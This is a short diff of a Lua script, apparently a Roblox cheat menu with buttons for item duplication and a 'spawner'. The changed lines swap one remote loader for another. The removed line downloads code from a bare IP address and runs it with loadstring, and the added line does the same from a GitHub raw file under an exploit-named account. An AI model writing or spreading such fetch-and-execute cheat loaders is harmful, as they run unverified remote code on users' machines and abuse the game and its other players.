@@ -134,8 +134,8 @@ createButton("Button4", "For Duping\n(1 Player On Server only)", function()
 end)
 
 -- ✅ Added Brainrot Spawner
-createButton("Button5", "Brainrot Spawner", function()
-    loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+createButton("Button5", "Leak Spawner", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/AddBrenrot/refs/heads/main/addbrenrot.txt"))()
 end)
 
 -- Close behavior
